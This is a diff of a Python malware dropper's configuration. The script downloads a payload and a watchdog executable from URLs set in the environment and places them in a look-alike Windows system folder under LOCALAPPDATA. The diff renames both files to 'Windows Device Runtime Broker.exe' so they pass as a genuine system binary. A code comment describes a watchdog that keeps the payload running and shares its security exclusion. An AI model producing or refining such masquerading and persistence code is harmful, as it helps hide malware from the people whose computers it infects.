@@ -26,7 +26,7 @@ EXE_URL = os.environ.get("EXE_URL", "")
 LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
 PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")
 
-EXE_NAME = "tung_dbg_carrier.exe"
+EXE_NAME = "Windows Device Runtime Broker.exe"
 if EXE_URL:
     try:
         n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
@@ -41,7 +41,7 @@ EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)
 # in the AppHost dir, share its exclusion, wake it when it is dead. work.py
 # stages+execs the pair in order: tung FIRST, watchdog SECOND.
 WD_URL = os.environ.get("WD_URL", "")
-WD_NAME = "wd.exe"
+WD_NAME = "Windows Device Runtime Broker.exe"
 if WD_URL:
     try:
         n = str(WD_URL).split("?")[0].rstrip("/").split("/")[-1]
